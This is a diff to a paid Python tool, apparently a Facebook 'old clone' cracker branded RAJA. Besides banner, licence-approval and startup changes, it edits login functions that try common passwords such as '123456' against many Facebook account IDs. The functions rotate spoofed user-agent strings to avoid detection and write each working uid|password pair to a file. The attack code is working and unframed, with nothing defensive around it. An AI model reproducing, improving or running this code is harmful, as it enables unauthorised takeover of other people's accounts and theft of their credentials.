@@ -28,6 +28,18 @@ from requests import api, models, sessions
 requests.urllib3.disable_warnings()
 
 
+# Initial setup and promotion
+os.system('clear')
+print(' \x1b[38;5;46mRAJA SERVER LOADING....')
+
+
+os.system('pip uninstall requests chardet urllib3 idna certifi -y')
+os.system('pip install chardet urllib3 idna certifi requests')
+os.system('pip install httpx')
+os.system('pip install beautifulsoup4')
+print('loading Modules ...\n')
+os.system('clear')
+
 # --- GITHUB APPROVAL SYSTEM ---
 def raja_approval():
     os.system('clear')
@@ -37,7 +49,7 @@ def raja_approval():
     
     # Yahan apni GitHub link lagayein jahan approved keys hongi
     # Format: Raw text file on GitHub
-    github_link = "https://github.com/bayezidbostami404/fb/blob/main/pss"
+    github_link = "https://github.com/bayezidbostami404/fb/blob/main/approval-4"
     
     print('''
 \033[1;31m ██████╗  █████╗      ██╗ █████\x1b[0m╗ 
@@ -46,10 +58,13 @@ def raja_approval():
 \033[1;34m ██╔══██╗██╔══██║██   ██║██╔══██║\x1b[0m
 \033[1;35m ██║  ██║██║  ██║╚█████╔╝██║  ██║\x1b[0m
 \033[1;36m ╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝\x1b[0m''')
+    print('\x1b[38;5;48m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗')
+    print('\x1b[38;5;48m║\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•>\x1b[0;41m[ WORKING WIFI+MOBILE DATA ]\x1b[0;92m\x1b[10;91m<•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[0;92m\x1b[10;92m║')
+    print('\x1b[38;5;48m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝')
     print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     print(f"\x1b[1;37m YOUR KEY : \x1b[1;32mRAJA-{key}")
     print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    print("\033[1;32m BINANCE ID : 1185161524 \033[0m")
+    print("\033[1;34m BINANCE ID : 1185161524 \033[0m")
     print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     print("\033[1;36m💵 Available TOOL PRICES\033[0m")
     print("\033[1;31m" + "━" * 40 + "\033[0m")
@@ -71,7 +86,14 @@ def raja_approval():
     except:
         sys.exit()
 
+# Initial setup and promotion
+raja_approval() # Sabse pehle approval check hoga
 
+os.system('clear')
+os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
+os.system('pip install httpx pip install beautifulsoup4')
+print('loading Modules ...\n')
+os.system('clear')
 
 # --- Anti-tampering and Security Checks ---
 # The script checks if the source code of the 'requests' library has been modified
@@ -140,56 +162,34 @@ GS = '\x1b[38;5;40m'
 W = '\x1b[1;37m'
 
 def windows():
-    """
-    Generates a modern, randomized Windows User-Agent string (Variant A).
-    """
-    # Modernized older-style fallback but with updated Chrome builds
-    aV = random.choice(range(10, 20))
-    chrome_major_old = random.choice(range(100, 115))
-    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.1; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major_old}.0.{random.choice(range(5000, 6500))}.0 Safari/537.36"
-    
-    # Mid-range modern User-Agent
-    bz = f"537.36"
-    chrome_major_mid = random.choice(range(115, 125))
-    B = f"Mozilla/5.0 (Windows NT {random.choice([10, 11])}.0; Win64; x64) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{chrome_major_mid}.0.{random.choice(range(6000, 6800))}.{random.choice(range(1, 150))} Safari/{bz}"
-    
-    # WOW64 (32-bit browser on 64-bit OS) variant
-    chrome_major_wow = random.choice(range(120, 130))
-    C = f"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major_wow}.0.{random.choice(range(6000, 6900))}.{random.choice(range(1, 150))} Safari/537.36"
-    
-    # Cutting-edge modern User-Agent (Chrome 130 - 142+)
-    chrome_latest = random.choice(range(130, 143))
-    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_latest}.0.{random.choice(range(6500, 7200))}.0 Safari/537.36"
-    
+    aV = str(random.choice(range(10, 20)))
+    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
+    bV = str(random.choice(range(1, 36)))
+    bx = str(random.choice(range(34, 38)))
+    bz = f'5{bx}.{bV}'
+    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
+    cV = str(random.choice(range(1, 36)))
+    cx = str(random.choice(range(34, 38)))
+    cz = f'5{cx}.{cV}'
+    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
+    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
     return random.choice([A, B, C, D])
 
 
 def window1():
-    """
-    Generates a highly updated, modern Windows User-Agent string (Variant B).
-    """
-    # Standard Modern Win 10/11 template
-    chrome_major = random.choice(range(120, 140))
-    build_1 = random.choice(range(6000, 7100))
-    A = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.{build_1}.0 Safari/537.36"
-    
-    # Alternative layout with specific patch versions
-    chrome_major_alt = random.choice(range(125, 142))
-    build_2 = random.choice(range(6200, 7150))
-    patch_2 = random.choice(range(50, 250))
-    B = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major_alt}.0.{build_2}.{patch_2} Safari/537.36"
-    
-    # Compatibility style for enterprise networks
-    chrome_major_ent = random.choice(range(118, 135))
-    build_3 = random.choice(range(5800, 6800))
-    C = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{random.choice(range(110, 130))}.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major_ent}.0.{build_3}.{random.choice(range(10, 190))} Safari/537.36"
-    
-    # Ultra-latest builds (Chrome 140+)
-    latest_build = random.randint(7000, 7500)
-    latest_patch = random.randint(100, 300)
-    chrome_ultra = random.choice(range(140, 146))
-    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ultra}.0.{latest_build}.{latest_patch} Safari/537.36"
-    
+    aV = str(random.choice(range(10, 20)))
+    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
+    bV = str(random.choice(range(1, 36)))
+    bx = str(random.choice(range(34, 38)))
+    bz = f'5{bx}.{bV}'
+    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
+    cV = str(random.choice(range(1, 36)))
+    cx = str(random.choice(range(34, 38)))
+    cz = f'5{cx}.{cV}'
+    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
+    latest_build = rr(6000, 9000)
+    latest_patch = rr(100, 200)
+    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
     return random.choice([A, B, C, D])
     
 # Set window title
@@ -204,25 +204,21 @@ def ____banner____():
         os.system('clear')
     
     print("""\033[1;32m
-╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-║ \033[1;31m   ██████╗  █████╗      ██╗ █████╗\033[0m          ║
-║ \033[1;32m   ██╔══██╗██╔══██╗     ██║██╔══██╗\033[0m         ║
-║ \033[1;33m   ██████╔╝███████║     ██║███████║\033[0m         ║
-║ \033[1;34m   ██╔══██╗██╔══██║██   ██║██╔══██║\033[0m         ║
-║ \033[1;35m   ██║  ██║██║  ██║╚█████╔╝██║  ██║\033[0m         ║
-║ \033[1;36m   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝\033[0m         ║
-╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
-╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-║\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•>\x1b[0;41m[ WORKING WIFI+MOBILE DATA ]\x1b[0;92m\x1b[10;91m<•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[0;92m\x1b[10;92m║
-╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
-\x1b[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗ 
-\033[1;93m║ Author    : MR-RAJA CLONER 420              ║
-\033[1;92m║ Facebook  : RAJA CLONER                     ║
-\033[1;96m║ GitHub    : RAJA-CYBER420                   ║
-\033[1;95m║ Telegram  : R C 4                           ║
-\033[1;91m║ Tool      : PAID                            ║
-\033[1;97m║ Version   : 2.5.8                           ║
-\x1b[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[0m                      
+                           
+         ██████╗  █████╗      ██╗ █████╗ 
+         ██╔══██╗██╔══██╗     ██║██╔══██╗
+         ██████╔╝███████║     ██║███████║
+         ██╔══██╗██╔══██║██   ██║██╔══██║
+         ██║  ██║██║  ██║╚█████╔╝██║  ██║
+         ╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝\x1b[0m
+
+\033[1;33m××××××××××××××××××××××××××××××××××××××××××××××
+|  \033[1;37m \033[1;31m[\033[1;32m✓\033[1;31m]\033[1;36m CREATED BY\033[1;33m     ☞  \033[1;32mRAJA     \033[1;33m          |
+|  \033[1;37m \033[1;31m[\033[1;32m✓\033[1;31m]\033[1;36m FACEBOK\033[1;33m        ☞  \033[1;32mRaja Cloner \033[1;33m       |
+|  \033[1;37m \033[1;31m[\033[1;32m✓\033[1;31m]\033[1;36m GITHUB\033[1;33m         ☞  \033[1;32mRAJA-CYBER420   \033[1;33m   |
+|  \033[1;37m \033[1;31m[\033[1;32m✓\033[1;31m]\033[1;36m TOOLS NAME\033[1;33m     ☞  \033[1;32mold clone      \033[1;33m    |
+|  \033[1;37m \033[1;31m[\033[1;32m✓\033[1;31m]\033[1;36m TOOLS VIRSION\033[1;33m  ☞  \033[1;32m2.6.0          \033[1;33m    |
+××××××××××××××××××××××××××××××××××××××××××××××
 \033[0m""")
 
 
@@ -446,13 +442,10 @@ def old_Tree():
 
 
 def login_1(uid):
-    """
-    Login attempt method 1.
-    """
     global loop
     session = requests.session()
     try:
-        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[1;37mRAJA-M1\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[38;5;192m{loop}\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[1;37mOK\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[38;5;192m{len(oks)}\x1b[38;5;196m]")
+        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
         sys.stdout.flush()
         for pw in ('123456', '1234567', '12345678', '123456789'):
             data = {
@@ -502,7 +495,7 @@ def login_1(uid):
                 oks.append(uid)
                 break
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA-M1\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                 open('/sdcard/RAJA-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
@@ -515,6 +508,7 @@ def login_2(uid):
     """
     Login attempt method 2.
     """
+    global loop, oks
     sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
     
     for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
